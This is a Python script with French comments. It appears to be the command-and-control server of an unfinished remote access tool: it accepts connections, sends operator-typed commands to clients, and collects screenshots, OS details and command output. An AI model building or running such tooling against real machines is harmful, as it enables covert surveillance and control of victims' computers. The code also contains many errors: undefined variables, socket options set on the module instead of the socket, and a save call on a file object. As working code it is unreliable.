import socket as s
import io
from PIL import Image
import time
from threading import Thread
from socketserver import ThreadingMixIn

command = str()
counter = 0
host = ""
portS = "1234"

#class
class myThread(Thread):
    def __init__(self,ip,port):
        Thread.__init__(self)
        self.ip = ip
        self.port = port
        print ("[+] Nouveau thread démarré pour " + ip + ":" + str(port))

    def run(self):
        while command != "exit":
            print("#")
            command = input()
            conf.send(command.encode('UTF-8'))
            if command == "screen":
                message= conf.recv(262144)
                f = open("note","wb")
                f.write(message)
                f.close()
                f.save("monitor-screen.png")
            elif command == "os":
                message= conf.recv(262144)
                message=message.decode("UTF-8")
                print(message)
            elif command == "candc":
                message= conf.recv(262144)
                message=message.decode("UTF-8")
                print(message)
            else:
                message = conf.recv(262144)
                print(message)
                message = message.decode('850')
                print(message)
        mon_socket.close()
        conf.close()


# Création du socket
mon_socket = s.socket(s.AF_INET,s.SOCK_STREAM)
s.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1)
mon_socket.bind((host,port))
mythreadTab = []

while True:
    print("Serveur prêt, en attente de requêtes")
    mon_socket.listen(5)
    conf,ADRESSE = mon_socket.accept()
    print("Connexion établie, adresse %s, port %s "%(format(ADRESSE[0], ADRESSE[1])))
    mythread = myThread(ADRESSE[0],ADRESSE[1])
    mythread.start()
    mythreadTab.append(mythread)

for t in mythreadTab:
    t.join()


### Code multithearding en cour
